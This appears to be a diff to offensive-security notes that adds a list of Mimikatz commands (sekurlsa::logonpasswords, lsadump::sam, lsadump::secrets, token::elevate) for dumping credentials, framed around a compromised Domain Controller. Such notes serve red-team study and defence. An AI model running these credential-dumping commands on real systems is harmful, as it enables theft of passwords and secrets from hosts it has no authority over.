@@ -330,6 +330,13 @@
 * it's a cat and mouse game with Windows and Mimikatz, Windows patches, Mimikatz updates...
 * download it directly to your Domain Controller (assuming that you already compromised it)
 * check out the Wiki on the Mimikatz github repo for more information on the different things it can do
+* additional Mimikatz commands:
+* > privilege::debug sekurlsa::logonpasswords
+* > sekurlsa::logonpasswords
+* > lsadump::sam
+* > token::elevate lsadump::sam
+* > lsadump::secrets
+* > token::elevate lsadump::sam
 
 #### Credential Dumping with Mimikatz
 
